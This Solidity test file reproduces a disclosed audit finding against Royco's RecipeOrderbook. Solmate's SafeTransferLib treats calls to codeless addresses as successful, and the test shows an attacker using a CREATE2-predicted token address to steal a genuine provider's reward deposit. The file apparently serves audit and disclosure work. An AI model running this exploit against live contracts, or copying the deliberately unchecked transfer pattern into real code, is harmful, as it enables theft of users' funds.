// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/*//////////////////////////////////////////////////////////////////////////
    Royco RecipeOrderbook — "Successful transfers on non-existent tokens
    allows attackers to steal reward tokens" (Cantina, Aug 2024, id 46673)

    Root cause: Solmate's SafeTransferLib.safeTransferFrom / safeTransfer
    succeed even when the token address has NO code — a CALL to a codeless
    address returns success with no return data, and the library treats
    `iszero(returndatasize())` as success. RecipeOrderbook.createIPOrder
    (RecipeOrderbook.sol#L383) pulls the offered reward tokens with no
    code-existence check, so an attacker can register a fully "funded" IP
    order against a token that has not been deployed yet, pulling ZERO real
    tokens. Once a genuine incentive provider funds a real order with the
    (now deployed) token, the attacker fills their own phantom order
    (RecipeOrderbook.sol#L534) and drains the genuine deposit.

    This file is fully self-contained: only forge-std is imported. The
    vulnerable SafeTransferLib assembly is copied VERBATIM from Solmate;
    the RecipeOrderbook logic is a minimal faithful reduction of the two
    blamed call sites.
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
                        Minimal ERC20 token
    (stands in for Solmate ERC20 / the audit's MockERC20)
//////////////////////////////////////////////////////////////*/
contract ERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        unchecked {
            balanceOf[to] += amount;
        }
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        unchecked {
            balanceOf[to] += amount;
        }
        return true;
    }

    function mint(address to, uint256 amount) public {
        totalSupply += amount;
        unchecked {
            balanceOf[to] += amount;
        }
    }
}

contract MockERC20 is ERC20 {
    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {}
}

/*//////////////////////////////////////////////////////////////
    Solmate SafeTransferLib — VERBATIM assembly.
    Note: "none of the functions in this library check that a token has
    code at all!" A call to a codeless address succeeds with no return
    data, so `iszero(returndatasize())` makes `success` true.
//////////////////////////////////////////////////////////////*/
library SafeTransferLib {
    function safeTransferFrom(ERC20 token, address from, address to, uint256 amount) internal {
        bool success;

        /// @solidity memory-safe-assembly
        assembly {
            // Get a pointer to some free memory.
            let freeMemoryPointer := mload(0x40)

            // Write the abi-encoded calldata into memory, beginning with the function selector.
            mstore(freeMemoryPointer, 0x23b872dd00000000000000000000000000000000000000000000000000000000)
            mstore(add(freeMemoryPointer, 4), and(from, 0xffffffffffffffffffffffffffffffffffffffff)) // Append and mask the "from" argument.
            mstore(add(freeMemoryPointer, 36), and(to, 0xffffffffffffffffffffffffffffffffffffffff)) // Append and mask the "to" argument.
            mstore(add(freeMemoryPointer, 68), amount) // Append the "amount" argument. Masking not required as it's a full 32 byte type.

            success := and(
                // Set success to whether the call reverted, if not we check it either
                // returned exactly 1 (can't just be non-zero data), or had no return data.
                or(and(eq(mload(0), 1), gt(returndatasize(), 31)), iszero(returndatasize())),
                // We use 100 because the length of our calldata totals up like so: 4 + 32 * 3.
                // We use 0 and 32 to copy up to 32 bytes of return data into the scratch space.
                // Counterintuitively, this call must be positioned second to the or() call in the
                // surrounding and() call or else returndatasize() will be zero during the computation.
                call(gas(), token, 0, freeMemoryPointer, 100, 0, 32)
            )
        }

        require(success, "TRANSFER_FROM_FAILED");
    }

    function safeTransfer(ERC20 token, address to, uint256 amount) internal {
        bool success;

        /// @solidity memory-safe-assembly
        assembly {
            // Get a pointer to some free memory.
            let freeMemoryPointer := mload(0x40)

            // Write the abi-encoded calldata into memory, beginning with the function selector.
            mstore(freeMemoryPointer, 0xa9059cbb00000000000000000000000000000000000000000000000000000000)
            mstore(add(freeMemoryPointer, 4), and(to, 0xffffffffffffffffffffffffffffffffffffffff)) // Append and mask the "to" argument.
            mstore(add(freeMemoryPointer, 36), amount) // Append the "amount" argument. Masking not required as it's a full 32 byte type.

            success := and(
                // Set success to whether the call reverted, if not we check it either
                // returned exactly 1 (can't just be non-zero data), or had no return data.
                or(and(eq(mload(0), 1), gt(returndatasize(), 31)), iszero(returndatasize())),
                // We use 68 because the length of our calldata totals up like so: 4 + 32 * 2.
                // We use 0 and 32 to copy up to 32 bytes of return data into the scratch space.
                // Counterintuitively, this call must be positioned second to the or() call in the
                // surrounding and() call or else returndatasize() will be zero during the computation.
                call(gas(), token, 0, freeMemoryPointer, 68, 0, 32)
            )
        }

        require(success, "TRANSFER_FAILED");
    }
}

/*//////////////////////////////////////////////////////////////
    Minimal faithful reduction of Royco RecipeOrderbook.sol
    (only the two blamed call sites and their supporting state).
//////////////////////////////////////////////////////////////*/
contract RecipeOrderbook {
    using SafeTransferLib for ERC20;

    enum RewardStyle {
        Upfront,
        Arrear,
        Forfeitable
    }

    struct Recipe {
        bytes32[] weirollCommands;
        bytes[] weirollState;
    }

    struct Market {
        address inputToken;
        uint256 lockupTime;
        uint256 frontendFee; // 1e18 == 100%
        RewardStyle rewardStyle;
    }

    struct IPOrder {
        uint256 targetMarketID;
        address ip;
        uint256 quantity;
        address[] tokensOffered;
        uint256[] amountsOffered;
    }

    uint256 public numMarkets;
    uint256 public numOrders;
    mapping(uint256 => Market) public marketIDToMarket;
    mapping(uint256 => IPOrder) internal orderIDToIPOrder;

    function createMarket(
        address inputToken,
        uint256 lockupTime,
        uint256 frontendFee,
        Recipe memory, /* depositRecipe */
        Recipe memory, /* withdrawRecipe */
        RewardStyle rewardStyle
    ) external returns (uint256 marketID) {
        marketID = numMarkets++;
        marketIDToMarket[marketID] = Market(inputToken, lockupTime, frontendFee, rewardStyle);
    }

    function createIPOrder(
        uint256 targetMarketID,
        uint256 quantity,
        uint256, /* expiry */
        address[] memory tokensOffered,
        uint256[] memory tokenAmounts
    ) external returns (uint256 orderID) {
        orderID = numOrders++;
        IPOrder storage order = orderIDToIPOrder[orderID];
        order.targetMarketID = targetMarketID;
        order.ip = msg.sender;
        order.quantity = quantity;
        order.tokensOffered = tokensOffered;
        order.amountsOffered = tokenAmounts;

        // RecipeOrderbook.sol#L383 — pull the offered incentive tokens from the IP.
        // @> No check that `tokensOffered[i]` has code. SafeTransferLib silently
        // @> succeeds on a codeless address, so an attacker can record a fully
        // @> "funded" order against a not-yet-deployed token while depositing NOTHING.
        for (uint256 i = 0; i < tokensOffered.length; ++i) {
            ERC20(tokensOffered[i]).safeTransferFrom(msg.sender, address(this), tokenAmounts[i]);
        }
    }

    function fillIPOrder(
        uint256 orderID,
        uint256 fillAmount,
        address, /* fundingVault */
        address /* frontendFeeRecipient */
    ) external {
        IPOrder storage order = orderIDToIPOrder[orderID];
        Market storage market = marketIDToMarket[order.targetMarketID];

        // LP supplies the market input tokens for the fill.
        ERC20(market.inputToken).safeTransferFrom(msg.sender, address(this), fillAmount);

        uint256 fillPercentage = (fillAmount * 1e18) / order.quantity;

        // RecipeOrderbook.sol#L534 — pay the recorded incentive out to the LP (the attacker).
        // The reward-token balance is commingled across all orders, so this pays the
        // attacker's phantom order out of the genuine IP's real deposit.
        for (uint256 i = 0; i < order.tokensOffered.length; ++i) {
            uint256 amount = (order.amountsOffered[i] * fillPercentage) / 1e18;
            uint256 frontendFeeAmount = (amount * market.frontendFee) / 1e18;
            uint256 incentiveAmount = amount - frontendFeeAmount;
            ERC20(order.tokensOffered[i]).safeTransfer(msg.sender, incentiveAmount);
        }
    }
}

/*//////////////////////////////////////////////////////////////
    CREATE2 factory: lets us know a token's address BEFORE it is
    deployed (verbatim from the finding's PoC).
//////////////////////////////////////////////////////////////*/
contract DeterminsticTokenFactory {
    function deploy(uint256 _salt) public payable returns (address) {
        return address(new MockERC20{ salt: bytes32(_salt) }("Name", "Symbol"));
    }

    function getBytecode() public pure returns (bytes memory) {
        bytes memory bytecode = type(MockERC20).creationCode;
        return abi.encodePacked(bytecode, abi.encode("Name", "Symbol"));
    }

    function getAddress(uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff), // 0
                address(this), // address of factory contract
                _salt, // a random salt
                keccak256(getBytecode()) // the token contract bytecode
            )
        );
        return address(uint160(uint256(hash)));
    }
}

contract NonExistentTokenExploitTest is Test {
    RecipeOrderbook orderbook;
    MockERC20 mockToken; // market input (LP) token
    MockERC20 mockVault; // funding-vault placeholder
    address attacker = address(0xA);
    address user2 = address(0xB);

    function setUp() public {
        orderbook = new RecipeOrderbook();
        mockToken = new MockERC20("LP", "LP");
        mockVault = new MockERC20("Vault", "VLT");
    }

    function test_NonExistentTokenRewardTheft() public {
        DeterminsticTokenFactory factory = new DeterminsticTokenFactory();
        uint256 salt = 1;

        // Reward token address is known ahead of time but has NO code yet.
        MockERC20 rewardToken = MockERC20(factory.getAddress(salt));
        assertEq(address(rewardToken).code.length, 0, "reward token should not exist yet");

        RecipeOrderbook.Recipe memory depositRecipe = RecipeOrderbook.Recipe(new bytes32[](0), new bytes[](0));
        RecipeOrderbook.Recipe memory withdrawRecipe = RecipeOrderbook.Recipe(new bytes32[](0), new bytes[](0));

        // 1. Attacker creates a market and places a "funded" IP order against the codeless token.
        //    createIPOrder's safeTransferFrom succeeds even though nothing is pulled.
        vm.startPrank(attacker);
        orderbook.createMarket(
            address(mockToken), 1 days, 0.002e18, depositRecipe, withdrawRecipe, RecipeOrderbook.RewardStyle.Upfront
        );

        address[] memory tokensOffered = new address[](1);
        tokensOffered[0] = address(rewardToken);
        uint256[] memory tokenAmounts = new uint256[](1);
        tokenAmounts[0] = 100 ether;
        uint256 DUST_AMOUNT_OF_LP_TOKENS = 1;
        uint256 attackerOrderId = orderbook.createIPOrder(
            0, // marketId
            DUST_AMOUNT_OF_LP_TOKENS, // quantity
            block.timestamp + 1 days, // expiry
            tokensOffered,
            tokenAmounts
        );
        vm.stopPrank();
        // The createIPOrder above did NOT revert even though the reward token has no code:
        // safeTransferFrom silently succeeded and pulled ZERO real tokens. (We cannot read
        // balanceOf yet — a normal Solidity call to a codeless address reverts.)

        // 2. The reward token is actually deployed at the predicted address.
        rewardToken = MockERC20(factory.deploy(salt));
        assertGt(address(rewardToken).code.length, 0, "reward token now exists");

        // 3. A genuine incentive provider funds a REAL order with 100e18 of the reward token.
        rewardToken.mint(address(this), 1000 ether);
        rewardToken.approve(address(orderbook), 1000 ether);
        tokensOffered[0] = address(rewardToken);
        tokenAmounts[0] = 100 ether;
        orderbook.createIPOrder(
            0, // marketId
            100 ether, // quantity
            block.timestamp + 1 days, // expiry
            tokensOffered,
            tokenAmounts
        );
        // HARM PROOF #1: the orderbook holds ONLY the genuine IP's 100e18 — not 200e18 — proving
        // the attacker's earlier "funded" order deposited nothing (the phantom pull moved 0 tokens).
        assertEq(rewardToken.balanceOf(address(orderbook)), 100 ether, "only genuine IP funded 100e18");

        // 4. Attacker fills their OWN phantom order and drains the genuine IP's real reward tokens.
        vm.startPrank(attacker);
        mockToken.mint(attacker, DUST_AMOUNT_OF_LP_TOKENS);
        mockToken.approve(address(orderbook), DUST_AMOUNT_OF_LP_TOKENS);
        orderbook.fillIPOrder(attackerOrderId, DUST_AMOUNT_OF_LP_TOKENS, address(mockVault), user2);
        vm.stopPrank();

        // HARM PROOF #2: the attacker — who deposited ZERO reward tokens — walks away with
        // the genuine IP's funds (100e18 minus the 0.2e18 frontend fee left behind).
        assertEq(rewardToken.balanceOf(attacker), 99.8 ether, "attacker stole the genuine deposit");
        assertEq(rewardToken.balanceOf(address(orderbook)), 0.2 ether, "only the frontend fee remains");
    }
}
